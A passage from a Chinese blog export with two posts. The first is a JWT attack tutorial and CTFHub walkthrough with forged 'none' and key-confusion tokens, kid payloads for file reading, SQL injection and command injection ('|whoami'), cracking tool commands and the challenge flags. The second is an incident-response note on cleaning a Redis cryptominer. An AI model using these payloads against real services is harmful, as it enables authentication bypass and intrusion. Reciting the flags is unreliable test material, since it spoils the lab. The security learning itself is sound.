class=\"string\">&quot;None&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;typ&quot;</span> : <span class=\"string\">&quot;jwt&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;user&quot;</span> : <span class=\"string\">&quot;Admin&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>生成的完整token为<code>ew0KCSJhbGciIDogIk5vbmUiLA0KCSJ0eXAiIDogImp3dCINCn0.ew0KCSJ1c2VyIiA6ICJBZG1pbiINCn0</code></p>\n<p>(header+’.’+payload，去掉了’.’+signature字段)</p>\n<p>空加密算法的设计初衷是用于调试的，在生产环境中开启了空加密算法，缺少签名算法，jwt保证信息不被篡改的功能就失效了。攻击者只需要把alg字段设置为None，就可以在payload中构造身份信息，伪造用户身份。</p>\n<h5 id=\"RSA改为HMAC\"><a href=\"#RSA改为HMAC\" class=\"headerlink\" title=\"RSA改为HMAC\"></a>RSA改为HMAC</h5><p>JWT中最常用的两种算法为<code>HMAC</code>和<code>RSA</code>。</p>\n<p><code>HMAC</code>是密钥相关的哈希运算消息认证码（Hash-based Message Authentication Code）的缩写，它是一种对称加密算法，使用相同的密钥对传输信息进行加解密。</p>\n<p><code>RSA</code>则是一种非对称加密算法，使用私钥加密明文，公钥解密密文。</p>\n<p>在HMAC和RSA算法中，都是使用私钥对<code>signature</code>字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token。</p>\n<p>现在我们假设有这样一种情况，一个Web应用，在JWT传输过程中使用RSA算法，密钥<code>pem</code>对JWT token进行签名，公钥<code>pub</code>对签名进行验证。</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;alg&quot;</span> : <span class=\"string\">&quot;RS256&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;typ&quot;</span> : <span class=\"string\">&quot;jwt&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>通常情况下密钥<code>pem</code>是无法获取到的，但是公钥<code>pub</code>却可以很容易通过某些途径读取到，这时，将JWT的加密算法修改为HMAC，即</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;alg&quot;</span> : <span class=\"string\">&quot;HS256&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;typ&quot;</span> : <span class=\"string\">&quot;jwt&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>同时使用获取到的公钥<code>pub</code>作为算法的密钥，对token进行签名，发送到服务器端。</p>\n<p>服务器端会将RSA的公钥（<code>pub</code>）视为当前算法（HMAC）的密钥，使用HS256算法对接收到的签名进行验证。</p>\n<p><code>https://skysec.top/2018/05/19/2018CUMTCTF-Final-Web/#Pastebin/</code></p>\n<h4 id=\"密钥暴破\"><a href=\"#密钥暴破\" class=\"headerlink\" title=\"密钥暴破\"></a>密钥暴破</h4><p>暴破基础</p>\n<ul>\n<li>知悉JWT使用的加密算法</li>\n<li>一段有效的、已签名的token</li>\n<li>签名用的密钥不复杂（弱密钥）</li>\n</ul>\n<p>因此局限性还是较大</p>\n<p>工具参考如下：JWT-Tools</p>\n<p>简单的组合爆破起来相对较简单，一旦复杂起来将很难再进行实施爆破。</p>\n<h4 id=\"修改KID参数\"><a href=\"#修改KID参数\" class=\"headerlink\" title=\"修改KID参数\"></a>修改KID参数</h4><p><code>kid</code>是jwt header中的一个可选参数，全称是<code>key ID</code>，它用于指定加密算法的密钥</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;alg&quot;</span> : <span class=\"string\">&quot;HS256&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;typ&quot;</span> : <span class=\"string\">&quot;jwt&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;kid&quot;</span> : <span class=\"string\">&quot;/home/jwt/.ssh/pem&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>因为该参数可以由用户输入，因此也可能造成一些安全问题。</p>\n<h5 id=\"任意文件读取\"><a href=\"#任意文件读取\" class=\"headerlink\" title=\"任意文件读取\"></a>任意文件读取</h5><p><code>kid</code>参数用于读取密钥文件，但系统并不会知道用户想要读取的到底是不是密钥文件，因此，如果在没有对参数进行过滤的前提下，攻击者是可以读取到系统的任意文件的。</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;alg&quot;</span> : <span class=\"string\">&quot;HS256&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;typ&quot;</span> : <span class=\"string\">&quot;jwt&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;kid&quot;</span> : <span class=\"string\">&quot;/etc/passwd&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h5><p><code>kid</code>也可以从数据库中提取数据，这时候就有可能造成SQL注入攻击，通过构造SQL语句来获取数据或者是绕过signature的验证。</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;alg&quot;</span> : <span class=\"string\">&quot;HS256&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;typ&quot;</span> : <span class=\"string\">&quot;jwt&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;kid&quot;</span> : <span class=\"string\">&quot;key11111111&#x27; || union select &#x27;secretkey&#x27; -- &quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a>命令执行</h5><p>对<code>kid</code>参数过滤不严也可能会出现命令注入问题，但是利用条件比较苛刻。如果服务器后端使用的是Ruby，在读取密钥文件时使用了<code>open</code>函数，通过构造参数就可能造成命令注入。</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;/path/to/key_file|whoami&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>对于其他的语言，例如php，如果代码中使用的是<code>exec</code>或者是<code>system</code>来读取密钥文件，那么同样也可以造成命令注入，当然这个可能性就比较小了。</p>\n<h4 id=\"修改JKU-X5U\"><a href=\"#修改JKU-X5U\" class=\"headerlink\" title=\"修改JKU/X5U\"></a>修改JKU/X5U</h4><p><code>JKU</code>的全称是”JSON Web Key Set URL”，用于指定一组用于验证令牌的密钥的URL。类似于<code>kid</code>，<code>JKU</code>也可以由用户指定输入数据，如果没有经过严格过滤，就可以指定一组自定义的密钥文件，并指定web应用使用该组密钥来验证token。</p>\n<p><code>X5U</code>则以URI的形式数允许攻击者指定用于验证令牌的<strong>公钥证书或证书链</strong>，与<code>JKU</code>的攻击利用方式类似。</p>\n<h4 id=\"信息泄漏\"><a href=\"#信息泄漏\" class=\"headerlink\" title=\"信息泄漏\"></a>信息泄漏</h4><p>JWT保证的是数据传输过程中的完整性而不是机密性。</p>\n<p>由于payload是使用<code>base64url</code>编码的，所以相当于明文传输，如果在payload中携带了敏感信息（如存放密钥对的文件路径），单独对payload部分进行<code>base64url</code>解码，就可以读取到payload中携带的信息。</p>\n<h3 id=\"JWT-Tools\"><a href=\"#JWT-Tools\" class=\"headerlink\" title=\"JWT Tools\"></a>JWT Tools</h3><p><a href=\"https://github.com/brendan-rius/c-jwt-cracker\">JWT爆破</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/brendan-rius/c-jwt-cracker.git</span><br><span class=\"line\">cd c-jwt-cracker</span><br><span class=\"line\">brew install openssl</span><br><span class=\"line\">make OPENSSL=/usr/local/opt/openssl/include OPENSSL_LIB=-L/usr/local/opt/openssl/lib</span><br><span class=\"line\">./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/jwt/image-20201020161036706.png\" alt=\"image-20201020161036706\"></p>\n<p>JWT在线工具</p>\n<p><a href=\"https://jwt.io/\">JWT Online</a></p>\n<p><a href=\"https://github.com/ticarpi/jwt_tool\">JWT_Tool</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip3 install pycryptodomex</span><br><span class=\"line\">py3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.dkimTl0KydTeIHQ1UvhjAK7FPfArIkgf8XWp7VsKZyE</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/jwt/image-20201021113441020.png\" alt=\"image-20201021113441020\"></p>\n<p><img src=\"/images/jwt/image-20201021113549915.png\" alt=\"image-20201021113549915\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. 修改JWT</span><br><span class=\"line\">2. 生成None算法的JWT</span><br><span class=\"line\">3. 检查RS/HS256公钥错误匹配漏洞</span><br><span class=\"line\">4. 检测JKU密钥是否可伪造</span><br><span class=\"line\">5. 输入一个key,检查是否正确</span><br><span class=\"line\">6. 输入一个存放key的文本，检查是否正确</span><br><span class=\"line\">7. 输入字典文本，爆破</span><br><span class=\"line\">8. 输入RSA公钥，检查是否正确</span><br></pre></td></tr></table></figure>\n\n<p>\u001c交互工具</p>\n<p>主要针对<code>alg</code>被致None，因在线工具无法修改为None，所以需要使用交互方式来获取token。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python</span><br><span class=\"line\">import jwt</span><br><span class=\"line\">jwt.encode(payload)</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"JWT攻击\"><a href=\"#JWT攻击\" class=\"headerlink\" title=\"JWT攻击\"></a>JWT攻击</h3><p>以下题目参考<a href=\"https://www.ctfhub.com/\">ctfhub</a>中关于JWT的CTF试题学习并练习；算法修改并未得到flag。</p>\n<h4 id=\"题一：信息泄漏\"><a href=\"#题一：信息泄漏\" class=\"headerlink\" title=\"题一：信息泄漏\"></a>题一：信息泄漏</h4><p>题目提示信息：敏感信息泄漏</p>\n<p><img src=\"/images/jwt/image-20201020175137207.png\" alt=\"image-20201020175137207\"></p>\n<p>访问URL</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;challenge-f0ba92c933a7d9be.sandbox.ctfhub.com:10080&#x2F;</span><br></pre></td></tr></table></figure>\n\n<p>提示输入用户名及密码</p>\n<p><img src=\"/images/jwt/image-20201020175233885.png\" alt=\"image-20201020175233885\"></p>\n<p>观察响应数据</p>\n<p><img src=\"/images/jwt/image-20201020175334255.png\" alt=\"image-20201020175334255\"></p>\n<p>发现Cookie属于JWT</p>\n<p><img src=\"/images/jwt/image-20201020175407427.png\" alt=\"image-20201020175407427\"></p>\n<p>复制并提交在线工具</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eyJBRyI6ImI5MmNlNzk1NDg4ZTZjMDExNjBmNjU4fSIsInR5cCI6IkpXVCIsImFsZyI6IkhTMjU2In0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsIkZMIjoiY3RmaHViezA1OGFiZjNiM2IwZTlkOGQ1In0._TNIAg9rDfqtOFejHiIz9tXyJ7-hGqsKlJudTfXYZtw</span><br><span class=\"line\"></span><br><span class=\"line\"># 解码后由下图得知，flag只有一半，但是另一半在header中保存，拼接即可。</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/jwt/image-20201020175507938.png\" alt=\"image-20201020175507938\"></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ctfhub&#123;058abf3b3b0e9d8d5b92ce795488e6c01160f658&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"题二：None\"><a href=\"#题二：None\" class=\"headerlink\" title=\"题二：None\"></a>题二：None</h4><p>题目提示：JWT支持None，并且后端不执行签名验证。</p>\n<p><img src=\"/images/jwt/image-20201020192649086.png\" alt=\"image-20201020192649086\"></p>\n<p>访问URL</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;challenge-9f380c0d9554b48b.sandbox.ctfhub.com:10080&#x2F;login.php</span><br></pre></td></tr></table></figure>\n\n<p>admin/admin登录：提示只有admin才能获得flag值。</p>\n<p><img src=\"/images/jwt/image-20201020192750143.png\" alt=\"image-20201020192750143\"></p>\n<p><img src=\"/images/jwt/image-20201020192907650.png\" alt=\"image-20201020192907650\"></p>\n<p>获取登录token并进行在线解码处理</p>\n<p>分别对header、payload进行解码修改对应值并编码处理。</p>\n<p><img src=\"/images/jwt/image-20201021110733681.png\" alt=\"image-20201021110733681\"></p>\n<p><img src=\"/images/jwt/image-20201021110753552.png\" alt=\"image-20201021110753552\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 因后台不进行签名验证了，因此可直接替换对应值即可绕过。</span><br><span class=\"line\"># 因在线网站无法修改none，因此这里使用python的交互来获取token如下：</span><br><span class=\"line\">&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;none&quot;&#125;</span><br><span class=\"line\">&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;1&quot;,&quot;role&quot;:&quot;admin&quot;&#125;</span><br><span class=\"line\">jwt.encode(&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;1&quot;,&quot;role&quot;:&quot;admin&quot;&#125;,algorithm&#x3D;&quot;none&quot;,key&#x3D;&quot;&quot;)</span><br><span class=\"line\">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxIiwicm9sZSI6ImFkbWluIn0.</span><br></pre></td></tr></table></figure>\n\n<p>用none算法生成的JWT只有两部分了，根本连签名都不存在。</p>\n<p><img src=\"/images/jwt/image-20201021144848195.png\" alt=\"image-20201021144848195\"></p>\n<p>替换token，重放后可得到flag值</p>\n<p><img src=\"/images/jwt/image-20201021110552087.png\" alt=\"image-20201021110552087\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ctfhub&#123;adcd547cd87ee1536fba1a7fe530a8d9719e9ee3&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"题三：弱密码\"><a href=\"#题三：弱密码\" class=\"headerlink\" title=\"题三：弱密码\"></a>题三：弱密码</h4><p>由题目得知：JWT采用对称加密算法，如果密钥的强度较弱的话，会被爆破攻击。</p>\n<p><img src=\"/images/jwt/image-20201020201008964.png\" alt=\"image-20201020201008964\"></p>\n<p>访问URL</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;challenge-97dc1d0c313c1266.sandbox.ctfhub.com:10080&#x2F;login.php</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/jwt/image-20201020201106689.png\" alt=\"image-20201020201106689\"></p>\n<p>admin/admin</p>\n<p><img src=\"/images/jwt/image-20201020201132629.png\" alt=\"image-20201020201132629\"></p>\n<p>获取JWT的token</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.dkimTl0KydTeIHQ1UvhjAK7FPfArIkgf8XWp7VsKZyE</span><br></pre></td></tr></table></figure>\n\n<p>使用工具进行爆破得到密钥</p>\n<p><img src=\"/images/jwt/image-20201021111740982.png\" alt=\"image-20201021111740982\"></p>\n<p>修改对应值并获得最新的token</p>\n<p><img src=\"/images/jwt/image-20201021111921365.png\" alt=\"image-20201021111921365\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ctfhub&#123;11f50e22266935854562ba365e25aabd719a7cc3&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"题四：修改签名算法\"><a href=\"#题四：修改签名算法\" class=\"headerlink\" title=\"题四：修改签名算法\"></a>题四：修改签名算法</h4><p>题目：修改签名算法完成绕过;</p>\n<p><img src=\"/images/jwt/image-20201021112611069.png\" alt=\"image-20201021112611069\"></p>\n<p>访问URL</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;challenge-9fc2bbd399072286.sandbox.ctfhub.com:10080&#x2F;</span><br></pre></td></tr></table></figure>\n\n<p>登录入口信息及部分php提示</p>\n<p><img src=\"/images/jwt/image-20201021141803090.png\" alt=\"image-20201021141803090\"></p>\n<p>提示如下：主要关注点下面，主要是对JWT算法并绕过获得flag。</p>\n<p><img src=\"/images/jwt/image-20201021141738055.png\" alt=\"image-20201021141738055\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;,&quot;role&quot;:&quot;admin&quot;&#125;</span><br><span class=\"line\">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.LURZ-AAb42YweV6rAylSGFB19J5A3dbTMQw0TieJ3u8</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install pyjwt</span><br><span class=\"line\"></span><br><span class=\"line\">import jwt</span><br><span class=\"line\">import base64</span><br><span class=\"line\">public &#x3D; open(&#39;1.pem&#39;, &#39;r&#39;).read()</span><br><span class=\"line\">print jwt.encode(&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;,&quot;role&quot;:&quot;admin&quot;&#125;, key&#x3D;public, algorithm&#x3D;&#39;HS256&#39;)</span><br></pre></td></tr></table></figure>\n\n<p><code>未获取flag！！！</code></p>\n<h3 id=\"Referer\"><a href=\"#Referer\" class=\"headerlink\" title=\"Referer\"></a>Referer</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;6776</span><br><span class=\"line\">https:&#x2F;&#x2F;cyberpolygon.com&#x2F;materials&#x2F;security-of-json-web-tokens-jwt&#x2F;</span><br><span class=\"line\">https:&#x2F;&#x2F;medium.com&#x2F;swlh&#x2F;hacking-json-web-tokens-jwts-9122efe91e4a</span><br><span class=\"line\">JWT绕过CTF</span><br><span class=\"line\">https:&#x2F;&#x2F;delcoding.github.io&#x2F;2018&#x2F;03&#x2F;jwt-bypass&#x2F;</span><br><span class=\"line\">https:&#x2F;&#x2F;www.ctfhub.com&#x2F;</span><br><span class=\"line\">https:&#x2F;&#x2F;www.slideshare.net&#x2F;OWASP_Poland&#x2F;opd-2019-attacking-jwt-tokens</span><br></pre></td></tr></table></figure>\n\n"},{"title":"Linux应急示例","date":"2019-12-06T02:51:25.000Z","_content":"🤦‍♂公司某测试服对外的Redis被黑导致被植入挖矿程序(kdevtmpfsi),所以就想着整理一份简单的Linux应急学习学习.\n\n![](/images/yj/gj.png)\n\n<center>图:ECS告警</center>\n\n### 起因\n\nECS告警(如上图所示)某测试服,短信和控制台中提醒存在恶意程序(备注:上图只是存在恶意下载源,并不是真实恶意程序告警).因此赶紧进行应急处置(这里说下,告警要比应急早半天甚至一天时间,太滞后一定第一时间处置);原因是Redis对外服务未设置密码导致被攻击.\n\n### 实施\n\n#### 1.进程分析并kill\n\n进程分析:可结合ECS告警获取父进程路径及命令详细信息,再进行ps获取具体进程及守护进程信息;这里主要确定病毒主程序对应PID.\n\n![](/images/yj/rm.png)\n\n<center>图:清理记录</center>\n\n#### 2.ClamAV扫描\n\n因以上清理是另一同事清理,后又收到短信提醒说存在恶意进程信息(可能未清理完),干脆进行病毒扫描看下.\n\n工具使用参数介绍\n\n```php+HTML\nhttps://askubuntu.com/questions/250290/how-do-i-scan-for-viruses-with-clamav\n```\n\n![](/images/yj/av.png)\n\n<center>图:ClamAV执行</center>\n\n![](/images/yj/av1.png)\n\n<center>图:扫描结果</center>\n\n#### 3.在线监测\n\n![](/images/yj/jc.png)\n\n<center>图:检测结果</center>\n\n#### 4.清理\n\n定位恶意文件并清理内部其他恶意文件(red2.so、root这部分其实可对比新安装的Redis服务可快速判断恶意程序),以上检测是事后进行在线检测,第一时间先进行移除到本地留存.\n\n![](/images/yj/redis.png)\n\n<center>图:定位</center>\n\n![](/images/yj/redis1.png)\n\n<center>图:root文件内容</center>\n\n#### 5.shell\n\n根据root这个二进制文件提示下载地址下载shell分析可能存在系统部分命令替换、redis计划任务等信息.具体 [点击这里](http://www.si1ent.xyz/ziliao/shell.txt)\n\n![](/images/yj/shell.png)\n\n#### 6.计划任务清理\n\n![](/images/yj/cron.png)\n\n<center>图:Redis计划任务(ECS告警下载恶意源,目测服务已停)</center>\n\n### 总结\n\n以上是简单的挖矿病毒的清理,其实在进行应急时自然先确定告警事件类型(挖矿、勒索、挂马等),这样有助后面进行的一系列的应急实施.\n\n加固建议的话也可自行网上搜索也可参考如下:\n\n1、Redis禁止对外提供服务(配置文件修改并进行reload)\n\n2、清理计划任务crontab -r(不同账户下可能存在不同的计划任务／var/spool/cron/)\n\n3、更换一系列密码以防存在ssh免密登陆(从shell中得知重新写入key).\n\n4、命令可参考如下.\n\n### 命令\n\n#### 进程分析基础命令\n\n1.ps\n参数:(进程分析)\n-a //显示所有终端机下执行的进程\n-u //以用户为主的格式来显示进程状况\n-x //显示所有进程,不以终端机来区分\n-e //此参数的效果和指定\"A\"参数相同\n-f //显示UID,PPIP,C与STIME栏位\n\n常用:\nps -aux\nps -ef\n\n#### 网络监听\n\n2.netstat\n参数:(网络监听)\n-a //(all)显示所有选项,默认不显示LISTEN相关\n-t //(tcp)仅显示tcp相关选项\n-u //(udp)仅显示udp相关选项\n-n //拒绝显示别名,能显示数字的全部转化成数字(IP会直接显示)\n-l //仅列出有在Listen (监听) 的服務状态\n-p //显示建立相关链接的程序名\n-r //显示路由信息,路由表\n-e //显示扩展信息,例如uid等\n-s //按各个协议进行统计\n-c //每隔一个固定时间,执行该netstat命令\n\n常用:\nnetstat -lut //显示处于监听状态的tcp、udp端口\nnetstat -lutp //带有PID显示网络件监听情况\nnetstat -tpln //带有IP显示网络监听情况\nnetstat -tulpan -c 3 //每3秒打印监听情况到屏幕上\n\n#### 显示文件详情\n\n3.stat\n参数:(文件&目录信息)\n(备:此命令可查看一些恶意程序会替换系统内命令如:wget、curl等具有下载功能)\n-l //以ls -lT格式输出(文件权限、所属用户等信息)\n其他参数基本不用即可获取文件&目录详细信息.","source":"_posts/Linux应急示例.md","raw":"---\ntitle: Linux应急示例\ndate: 2019-12-06 10:51:25\ntags:\n - 应急\n---\n🤦‍♂公司某测试服对外的Redis被黑导致被植入挖矿程序(kdevtmpfsi),所以就想着整理一份简单的Linux应急学习学习.\n\n![](/images/yj/gj.png)\n\n<center>图:ECS告警</center>\n\n### 起因\n\nECS告警(如上图所示)某测试服,短信和控制台中提醒存在恶意程序(备注:上图只是存在恶意下载源,并不是真实恶意程序告警).因此赶紧进行应急处置(这里说下,告警要比应急早半天甚至一天时间,太滞后一定第一时间处置);原因是Redis对外服务未设置密码导致被攻击.\n\n### 实施\n\n#### 1.进程分析并kill\n\n进程分析:可结合ECS告警获取父进程路径及命令详细信息,再进行ps获取具体进程及守护进程信息;这里主要确定病毒主程序对应PID.\n\n![](/images/yj/rm.png)\n\n<center>图:清理记录</center>\n\n#### 2.ClamAV扫描\n\n因以上清理是另一同事清理,后又收到短信提醒说存在恶意进程信息(可能未清理完),干脆进行病毒扫描看下.\n\n工具使用参数介绍\n\n```php+HTML\nhttps://askubuntu.com/questions/250290/how-do-i-scan-for-viruses-with-clamav\n```\n\n![](/images/yj/av.png)\n\n<center>图:ClamAV执行</center>\n\n![](/images/yj/av1.png)\n\n<center>图:扫描结果</center>\n\n#### 3.在线监测\n\n![](/images/yj/jc.png)\n\n<center>图:检测结果</center>\n\n#### 4.清理\n\n定位恶意文件并清理内部其他恶意文件(red2.so、root这部分其实可对比新安装的Redis服务可快速判断恶意程序),以上检测是事后进行在线检测,第一时间先进行移除到本地留存.\n\n![](/images/yj/redis.png)\n\n<center>图:定位</center>\n\n![](/images/yj/redis1.png)\n\n<center>图:root文件内容</center>\n\n#### 5.shell\n\n根据root这个二进制文件提示下载地址下载shell分析可能存在系统部分命令替换、redis计划任务等信息.具体 [点击这里](http://www.si1ent.xyz/ziliao/shell.txt)\n\n![](/images/yj/shell.png)\n\n#### 6.计划任务清理\n\n![](/images/yj/cron.png)\n\n<center>图:Redis计划任务(ECS告警下载恶意源,目测服务已停)</center>\n\n### 总结\n\n以上是简单的挖矿病毒的清理,其实在进行应急时自然先确定告警事件类型(挖矿、勒索、挂马等),这样有助后面进行的一系列的应急实施.\n\n加固建议的话也可自行网上搜索也可参考如下:\n\n1、Redis禁止对外提供服务(配置文件修改并进行reload)\n\n2、清理计划任务crontab -r(不同账户下可能存在不同的计划任务／var/spool/cron/)\n\n3、更换一系列密码以防存在ssh免密登陆(从shell中得知重新写入key).\n\n4、命令可参考如下.\n\n### 命令\n\n#### 进程分析基础命令\n\n1.ps\n参数:(进程分析)\n-a //显示所有终端机下执行的进程\n-u //以用户为主的格式来显示进程状况\n-x //显示所有进程,不以终端机来区分\n-e //此参数的效果和指定\"A\"参数相同\n-f //显示UID,PPIP,C与STIME栏位\n\n常用:\nps -aux\nps -ef\n\n#### 网络监听\n\n2.netstat\n参数:(网络监听)\n-a //(all)显示所有选项,默认不显示LISTEN相关\n-t //(tcp)仅显示tcp相关选项\n-u //(udp)仅显示udp相关选项\n-n //拒绝显示别名,能显示数字的全部转化成数字(IP会直接显示)\n-l //仅列出有在Listen (监听) 